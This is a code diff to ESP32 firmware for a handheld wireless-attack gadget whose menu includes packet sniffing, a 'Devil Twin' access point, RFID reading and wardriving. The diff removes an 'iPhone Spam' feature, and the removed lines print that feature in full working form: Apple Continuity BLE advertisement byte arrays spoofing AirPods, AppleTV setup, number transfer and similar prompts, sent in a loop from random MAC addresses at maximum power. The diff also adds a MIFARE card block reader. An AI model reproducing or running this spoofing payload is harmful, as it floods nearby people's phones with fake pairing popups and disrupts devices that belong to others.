@@ -54,9 +54,9 @@ enum AppState {
   STATE_BT_SCAN,
   STATE_BT_SERIAL,
   STATE_BT_HID,
-  STATE_IPHONE_SPAM,
   STATE_DEVIL_TWIN,
   STATE_RFID,
+  STATE_READ_BLOCKS,
   STATE_WARDRIVER,
 };
 // Global variable to keep track of the current state
@@ -75,18 +75,16 @@ enum MenuItem {
   BT_CREATE,
   BT_SERIAL_CMD,
   BT_HID,
-  IPHONE_SPAM,
   // BEACON_SWARM,
   DEVIL_TWIN,
   RFID,
+  READ_BLOCKS,
   WARDRIVER,
   // RF_SCAN,
   PARTY_LIGHT,
   LIGHTOFF,
   FILES,
-  // ESPEE_BOT, // needs reworking
   // DEAUTH,
-  // GAMES, // needs implementation
   SETTINGS,
   HELP,
   NUM_MENU_ITEMS
@@ -108,7 +106,6 @@ enum BluetoothItem
   BT_CREATE,
   BT_SERIAL_CMD,
   BT_HID,
-  IPHONE_SPAM
 };
 enum RfidItem
 {
@@ -192,8 +189,6 @@ int rssiSum;
 // TRIGGERS
 bool ap_active = false;
 
-// TASKS
-TaskHandle_t iphoneSpamTask;
 
 // *** DISPLAY
 void initDisplay() {
@@ -215,7 +210,8 @@ void drawMenu() {
   display.setCursor(5, 4);                                             // Adjust as needed
   display.setTextSize(1);
   display.println("Home");  // Replace with dynamic title if needed
-  const char *menuLabels[NUM_MENU_ITEMS] = { "Packet Monitor", "Wifi Sniff", "AP Scan", "AP Join", "AP Create", "Stop AP", "Stop Server", "BT Scan", "BT Create", "BT Ser. CMD", "BT HID", "iPhone Spam", "Devil Twin", "RFID Read", "Wardriver", "Party Light", "Light Off", "Files", "Settings", "Help" };
+  const char *menuLabels[NUM_MENU_ITEMS] = { "Packet Monitor", "Wifi Sniff", "AP Scan", "AP Join", "AP Create", "Stop AP", "Stop Server", "BT Scan", "BT Create", "BT Ser. CMD", "BT HID", "Devil Twin", "RFID Read", "RFID Read Blocks", "Wardriver",
+                                             "Party Light", "Light Off", "Files", "Settings", "Help" };
   // Display the menu items in the blue area
   display.setTextColor(SSD1306_WHITE);  // White text in blue area
   for (int i = 0; i < 2; i++) {         // Only show 2 menu items at a time
@@ -236,6 +232,35 @@ void drawMenu() {
   }
   display.display();
   updateNeoPixel();
+}
+void displayInfo(String title, String info1 = "", String info2 = "", String info3 = "") {
+  display.clearDisplay();
+  drawBorder();
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+
+  // Title
+  display.setCursor(4, 4);
+  display.println(title);
+  display.drawLine(0, 14, SCREEN_WIDTH, 14, SSD1306_WHITE);
+
+  // Display info lines with proper spacing and truncation if needed
+  int maxTextWidth = 20;  // Approximate character limit per line for 128-pixel width
+
+  // Truncate lines if they exceed the max character count
+  if (info1.length() > maxTextWidth) info1 = info1.substring(0, maxTextWidth - 3) + "...";
+  if (info2.length() > maxTextWidth) info2 = info2.substring(0, maxTextWidth - 3) + "...";
+  if (info3.length() > maxTextWidth) info3 = info3.substring(0, maxTextWidth - 3) + "...";
+
+  // Info lines
+  display.setCursor(4, 18);
+  display.println(info1);
+  display.setCursor(4, 28);
+  display.println(info2);
+  display.setCursor(4, 38);
+  display.println(info3);
+
+  display.display();
 }
 
 // *** BLUETOOTH MODULES ***
@@ -286,7 +311,7 @@ void runBTScan() {
   int bleDeviceCount = foundDevices->getCount();
   int devicesPerPage = 4;  // Max devices displayed per page
   int currentPage = 0;
-  
+
   // Store relevant information and free scan results
   totalDevices = min(bleDeviceCount, 30);
   for (int i = 0; i < totalDevices; i++) {
@@ -574,161 +599,6 @@ void runBTHid() {
 }
 // END BT HID //
 
-// START IPHONE SPAM //
-// DEVICE VARIABLES //
-const uint8_t DEVICES[][31] = {
-  /*
-      These are audio devices: wireless headphones / earbuds
-      It seems these need a shorter range between ESP & iDevice
-    */
-  // Airpods
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Airpods Pro
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Airpods Max
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Airpods Gen 2
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Airpods Gen 3
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Airpods Pro Gen 2
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Power Beats
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Power Beats Pro
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Beats Solo Pro
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Beats Studio Buds
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Beats Flex
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Beats X
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Beats Solo 3
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Beats Studio 3
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Beats Studio Pro
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Betas Fit Pro
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-  // Beats Studio Buds Plus
-  { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
-};
-const uint8_t SHORT_DEVICES[][23] = {
-  /*
-      These are more general home devices
-      It seems these can work over long distances, especially AppleTV Setup
-    */
-  // AppleTV Setup
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // AppleTV Pair
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // AppleTV New User
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // AppleTV AppleID Setup
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // AppleTV Wireless Audio Sync
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // AppleTV Homekit Setup
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // AppleTV Keyboard Setup
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // AppleTV Connecting to Network
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // Homepod Setup
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // Setup New Phone
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // Transfer Number
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // TV Color Balance
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-  // Vision Pro
-  { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 },
-};
-
-BLEAdvertising *pAdvertising;  // global variable
-uint32_t delayMilliseconds = 5000;
-void initIphoneSpam() {
-  display.clearDisplay();
-  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);  // Set to a small font
-  u8g2_for_adafruit_gfx.setCursor(0, 10);
-  u8g2_for_adafruit_gfx.print("Running iPhone Spam...");
-  u8g2_for_adafruit_gfx.setCursor(0, 30);
-  u8g2_for_adafruit_gfx.print("Restart Phone to Stop...");
-  display.display();
-  BLEDevice::init("AirPods 69");
-
-  // Increase BLE Power to 9dBm (MAX)
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
-
-  // Create the BLE Server
-  BLEServer *pServer = BLEDevice::createServer();
-  Serial.println("Creating BT server");
-  delay(3000);
-  pAdvertising = pServer->getAdvertising();
-  delay(1000);
-
-  // seems we need to init it with an address in setup() step.
-  esp_bd_addr_t null_addr = { 0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69 };
-  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
-  delay(2000);
-}
-
-void runIphoneSpam(void *parameter) {
-  while (true) {
-    // Check if HOME_BUTTON is pressed
-    if (isButtonPressed(HOME_BUTTON_PIN)) {
-      currentState = STATE_MENU;
-      drawMenu();
-      delay(500);  // Debounce delay
-      return;
-    }
-
-    // Generate fake random MAC
-    esp_bd_addr_t dummy_addr = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-    for (int i = 0; i < 6; i++) {
-      dummy_addr[i] = random(256);
-    }
-
-    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
-
-    // Randomly pick data from one of the devices
-    int device_choice = random(2);
-
-    if (device_choice == 0) {
-      int index = random(17);
-      oAdvertisementData.addData(String((char *)DEVICES[index]));
-    } else {
-      int index = random(13);
-      oAdvertisementData.addData(String((char *)SHORT_DEVICES[index]));
-    }
-
-    int adv_type_choice = random(3);
-    if (adv_type_choice == 0) {
-      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
-    } else if (adv_type_choice == 1) {
-      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
-    } else {
-      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
-    }
-
-    // Set the device address, advertisement data
-    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
-    pAdvertising->setAdvertisementData(oAdvertisementData);
-
-    // Start advertising
-    Serial.println("Sending Advertisement...");
-    pAdvertising->start();
-    delay(100);  // Short delay
-    pAdvertising->stop();
-
-    // Delay to yield control
-    vTaskDelay(100 / portTICK_PERIOD_MS);  // 100 ms delay
-  }
-}
 // *** WIFI MODULES ***
 
 // Network data structure
@@ -1275,7 +1145,7 @@ void runPacketMon() {
 uint8_t channel = 1;
 //bool snifferRunning = true;
 
-static wifi_country_t wifi_country = {.cc = "CN", .schan = 1, .nchan = 13};  // Country configuration
+static wifi_country_t wifi_country = { .cc = "CN", .schan = 1, .nchan = 13 };  // Country configuration
 
 typedef struct {
   unsigned frame_ctrl : 16;
@@ -1313,7 +1183,8 @@ void wifi_sniffer_set_channel(uint8_t channel) {
 }
 
 const char *wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type) {
-  return (type == WIFI_PKT_MGMT) ? "MGMT" : (type == WIFI_PKT_DATA) ? "DATA" : "MISC";
+  return (type == WIFI_PKT_MGMT) ? "MGMT" : (type == WIFI_PKT_DATA) ? "DATA"
+                                                                    : "MISC";
 }
 
 void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type) {
@@ -1322,7 +1193,7 @@ void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type) {
   const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
   const wifi_ieee80211_mac_hdr_t *hdr = &((wifi_ieee80211_packet_t *)ppkt->payload)->hdr;
   char message[128];
-  
+
   snprintf(message, sizeof(message), "TYPE=%s CHAN=%d RSSI=%d A1=%02x:%02x:%02x:%02x:%02x:%02x",
            wifi_sniffer_packet_type2str(type), ppkt->rx_ctrl.channel, ppkt->rx_ctrl.rssi,
            hdr->addr1[0], hdr->addr1[1], hdr->addr1[2], hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
@@ -1344,7 +1215,7 @@ void runWifiSniffer() {
     delay(500);
     return;
   }
-  
+
   if (isButtonPressed(SELECT_BUTTON_PIN)) {
     snifferRunning = !snifferRunning;
     display.clearDisplay();
@@ -1760,15 +1631,14 @@ String getLocalTimestamp() {
 }
 
 void initGPS() {
+  display.clearDisplay();
+  displayInfo("Loading GPS", "Initializing...");
   gpsSerial.begin(GPSBaud, SERIAL_8N1, RXPin, TXPin);  // Start GPS serial communication
   delay(5000);                                         // Allow time for the system to stabilize
   Serial.print("GPS loaded.");
   // Initialize OLED display
-  display.display();
-  display.clearDisplay();
-  delay(3000);
   // Initialize SD card
-  Serial.println("Initializing SD card...");
+  //Serial.println("Initializing SD card...");
   /*
   if (!SD.begin(SD_CS_PIN)) {
       Serial.println("Initialization failed!");
@@ -1791,8 +1661,7 @@ void initGPS() {
   */
 
   rtc.begin(DateTime(F(__DATE__), F(__TIME__)));  // Initialize RTC with compile time
-
-  Serial.println(F("GPS and WiFi Scanner"));
+  displayInfo("GPS Loaded", "Wardriver Activated...");
 }
 
 void runGPS() {
@@ -1836,35 +1705,6 @@ MFRC522 mfrc522(SS_PIN, RST_PIN);
 void drawBorder() {
   display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, SSD1306_WHITE);
 }
-void displayInfo(String title, String info1 = "", String info2 = "", String info3 = "") {
-  display.clearDisplay();
-  drawBorder();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-
-  // Title
-  display.setCursor(4, 4);
-  display.println(title);
-  display.drawLine(0, 14, SCREEN_WIDTH, 14, SSD1306_WHITE);
-
-  // Display info lines with proper spacing and truncation if needed
-  int maxTextWidth = 20;  // Approximate character limit per line for 128-pixel width
-
-  // Truncate lines if they exceed the max character count
-  if (info1.length() > maxTextWidth) info1 = info1.substring(0, maxTextWidth - 3) + "...";
-  if (info2.length() > maxTextWidth) info2 = info2.substring(0, maxTextWidth - 3) + "...";
-  if (info3.length() > maxTextWidth) info3 = info3.substring(0, maxTextWidth - 3) + "...";
-
-  // Info lines
-  display.setCursor(4, 18);
-  display.println(info1);
-  display.setCursor(4, 28);
-  display.println(info2);
-  display.setCursor(4, 38);
-  display.println(info3);
-
-  display.display();
-}
 
 void initRFID() {
   Serial.println("MFRC522 NFC Reader");
@@ -1877,8 +1717,6 @@ void initRFID() {
   String fwVersion = "FW: " + String(mfrc522.PCD_ReadRegister(mfrc522.VersionReg), HEX);
   String chipInfo = "Chip: MFRC522";
   displayInfo("MFRC522 Info", chipInfo, fwVersion);
-  delay(2000);
-  displayInfo("Ready", "Waiting for card...", "Place card near", "the reader");
 }
 
 
@@ -1929,6 +1767,108 @@ void readRFID() {
 
     mfrc522.PICC_HaltA();
     mfrc522.PCD_StopCrypto1();
+  }
+}
+
+bool readBlock(uint8_t blockAddr, uint8_t *buffer) {
+  MFRC522::StatusCode status;
+  uint8_t size = 18;
+
+  status = mfrc522.MIFARE_Read(blockAddr, buffer, &size);
+  if (status != MFRC522::STATUS_OK) {
+    Serial.print(F("MIFARE_Read() failed: "));
+    Serial.println(mfrc522.GetStatusCodeName(status));
+    return false;
+  }
+  return true;
+}
+
+void handleReadBlock() {
+  unsigned long lastDebounceTime = 0;
+  const unsigned long debounceDelay = 200;
+  uint8_t blockAddr = 4;  // Default block to read
+
+
+  while (true) {
+    displayInfo("Read Block", "Place card and", "press UP to read", "HOME to exit");
+
+    // Check for exit condition
+    if (digitalRead(HOME_BUTTON_PIN) == LOW) {
+      if (millis() - lastDebounceTime > debounceDelay) {
+        lastDebounceTime = millis();
+        delay(1000);
+        currentState = STATE_MENU;
+        drawMenu();
+        delay(500);  // Debounce delay
+        break;
+      }
+    }
+
+    // Check for read trigger
+    if (digitalRead(UP_BUTTON_PIN) == LOW) {
+      if (millis() - lastDebounceTime > debounceDelay) {
+        lastDebounceTime = millis();
+
+        if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial()) {
+          uint8_t buffer[18];
+          bool success = readBlock(blockAddr, buffer);
+          if (success) {
+            display.clearDisplay();
+            display.setTextSize(1);
+            display.setTextColor(SSD1306_WHITE);
+            display.setCursor(0, 0);
+
+            display.print("Block: ");
+            display.println(blockAddr);
+            display.println();  // Add a blank line for spacing
+
+            String blockData = "";
+            for (uint8_t i = 0; i < 16; i++) {
+              blockData += (buffer[i] < 0x10 ? "0" : "") + String(buffer[i], HEX) + " ";
+
+              // Print every 8 bytes in a new line for better readability
+              if (i == 7) {
+                display.println(blockData);
+                blockData = "";  // Reset for the next line
+              }
+            }
+            // Print any remaining data in blockData
+            if (blockData.length() > 0) {
+              display.println(blockData);
+            }
+
+            display.println();  // Add a blank line for spacing
+            display.print("Press HOME to exit");
+
+            display.display();  // Send the buffer to the display
+            delay(5000);
+          } else {
+            display.clearDisplay();
+            display.setTextSize(1);
+            display.setTextColor(SSD1306_WHITE);
+            display.setCursor(0, 0);
+
+            display.print("Error: Failed to read");
+            display.println();
+            display.print("Block: ");
+            display.println(blockAddr);
+
+            display.println();  // Add a blank line for spacing
+            display.print("Press SELECT to exit");
+
+            display.display();  // Send the buffer to the display
+            delay(2000);
+          }
+          mfrc522.PICC_HaltA();
+          mfrc522.PCD_StopCrypto1();
+        }
+      }
+    }
+  }
+
+  // Wait for button release
+  while (digitalRead(SELECT_BUTTON_PIN) == LOW) {
+    delay(10);
   }
 }
 
@@ -2134,15 +2074,6 @@ void executeSelectedMenuItem() {
       delay(2000);
       runBTHid();
       break;
-    case IPHONE_SPAM:
-      Serial.println("IPHONE SPAM button pressed");
-      currentState = STATE_IPHONE_SPAM;
-      initIphoneSpam();
-      Serial.print("Starting bluetooth spam.");
-      delay(10000);
-      xTaskCreate(runIphoneSpam, "iPhoneSpam", 9000, NULL, 1, &iphoneSpamTask);
-      // runIphoneSpam();
-      break;
     case DEVIL_TWIN:
       Serial.println("DEVIL TWIN button pressed");
       currentState = STATE_DEVIL_TWIN;
@@ -2153,15 +2084,16 @@ void executeSelectedMenuItem() {
     case RFID:
       currentState = STATE_RFID;
       Serial.println("RFID button pressed");
-      initRFID();
-      delay(2000);
       readRFID();
+      break;
+    case READ_BLOCKS:
+      currentState = STATE_RFID;
+      Serial.println("READ_BLOCKS button pressed");
+      handleReadBlock();
       break;
     case WARDRIVER:
       Serial.println("WARDRIVER button pressed");
       currentState = STATE_WARDRIVER;
-      initGPS();
-      delay(2000);
       runGPS();
       break;
     case PARTY_LIGHT:
@@ -2217,17 +2149,18 @@ void setup() {
 
   // Initialize U8g2_for_Adafruit_GFX
   u8g2_for_adafruit_gfx.begin(display);
-  /*
-    strip.begin();
-    strip.setPixelColor(0, strip.Color(255, 0, 0)); // Bright red
-    strip.show();                                   // Initialize all pixels to 'off'
-    */
-
+  initRFID();
+  delay(1000);
+  initGPS();
+  delay(1000);
+  strip.begin();
+  strip.setPixelColor(0, strip.Color(150, 0, 0));  // Bright red
+  strip.show();                                    // Initialize all pixels to 'off'
   // Display splash screens
   /*displayTitleScreen();
-    delay(3000); // Show title screen for 3 seconds
+    delay(2000); // Show title screen for 3 seconds
     displayInfoScreen();
-    delay(5000); // Show info screen for 5 seconds
+    delay(2000); // Show info screen for 5 seconds
     */
   // Initial display
   drawMenu();
@@ -2332,16 +2265,6 @@ void loop() {
         return;
       }
       break;
-    case STATE_IPHONE_SPAM:
-      if (isButtonPressed(HOME_BUTTON_PIN)) {
-        cleanupBTScan();
-        delay(1000);
-        currentState = STATE_MENU;
-        drawMenu();
-        delay(500);  // Debounce delay
-        return;
-      }
-      break;
     case STATE_DEVIL_TWIN:
       if (isButtonPressed(HOME_BUTTON_PIN)) {
         // wifi cleanup
@@ -2361,6 +2284,16 @@ void loop() {
         return;
       }
       break;
+    case STATE_READ_BLOCKS:
+      if (isButtonPressed(HOME_BUTTON_PIN)) {
+        delay(1000);
+        currentState = STATE_MENU;
+        drawMenu();
+        delay(500);  // Debounce delay
+        return;
+      }
+      break;
+
     case STATE_WARDRIVER:
       if (isButtonPressed(HOME_BUTTON_PIN)) {
         delay(1000);
